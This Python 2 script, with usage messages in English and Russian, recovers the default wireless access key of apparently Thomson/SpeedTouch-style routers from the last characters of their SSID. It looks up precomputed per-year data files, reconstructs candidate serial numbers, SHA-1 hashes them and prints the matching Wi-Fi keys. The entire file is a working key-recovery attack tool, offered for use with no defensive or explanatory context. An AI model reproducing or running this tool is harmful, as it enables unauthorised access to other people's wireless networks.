#!/usr/bin/python
# -*- coding: utf-8 -*-

import hashlib
import sys
import binascii
import re

if len(sys.argv) < 2:
  print str(len(sys.argv))
  print "Usage: "
  print "python touchspeedcalc.py [SSID]"
  print "Where [SSID] are the last 6 characters of the SSID."
  print "Использовать:"
  print "python touchspeedcalc.py [SSID]"
  print "Где [SSID] это последнии 6 символов названия Wifi точки.(SSID)"
  sys.exit()
  
SSIDEND = sys.argv[1].upper()

if len(SSIDEND) == 6:
  FINDPOS = 0  
elif len(SSIDEND) == 4:
  FINDPOS = 1
else:
  print "SSID-end must be either 6 or 4 characters."
  print "SSID-заканчиваться должен на 6 или 4 чисвола."
  sys.exit()

YEARS = [ 2010, 2009, 2008, 2007, 2006, 2005, 2004 ]

def ascii2hex(char):
  return hex(ord(char))[2:].upper()

CHARSET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
BINCODE = binascii.unhexlify("".join(SSIDEND.split()))
for YEAR in YEARS:
  print str(YEAR)
  print "<br>"
  FILE = "touchspeed" + str(YEAR) + ".dat"
  INFILE = open(FILE,"rb")
  FILEDATA = INFILE.read()
  INFILE.close()
  WHEREFOUND = FILEDATA.find(BINCODE, 0)
  while (WHEREFOUND > -1):
    if WHEREFOUND % 3 == FINDPOS:
      PRODIDNUM = (WHEREFOUND / 3) % (36*36*36)
      PRODWEEK = (WHEREFOUND / 3) / (36*36*36) +1
      PRODID1 = PRODIDNUM / (36*36)
      PRODID2 = (PRODIDNUM / 36) % 36
      PRODID3 = PRODIDNUM % 36
      SERIAL = 'CP%02d%02d%s%s%s' % (YEAR-2000,PRODWEEK,ascii2hex(CHARSET[PRODID1:PRODID1+1]),ascii2hex(CHARSET[PRODID2:PRODID2+1]),ascii2hex(CHARSET[PRODID3:PRODID3+1]))
      SHA1SUM = hashlib.sha1(SERIAL).digest().encode("hex").upper()
      SSID = SHA1SUM[-6:]
      ACCESSKEY = SHA1SUM[0:10]
      if len(SSIDEND) == 4:
        ACCESSKEY = ACCESSKEY.lower()
      print "YEAR:", str(YEAR), "WEEK:", str(PRODWEEK), "PRODIDNUM:", str(PRODIDNUM)
      print "ACCESSKEY:", str(ACCESSKEY)
      print "Год:", str(YEAR), "Неделя:", str(PRODWEEK), "Партия:", str(PRODIDNUM)
      print "Ключ доступа:", str(ACCESSKEY)

    WHEREFOUND = FILEDATA.find(BINCODE, WHEREFOUND+1)
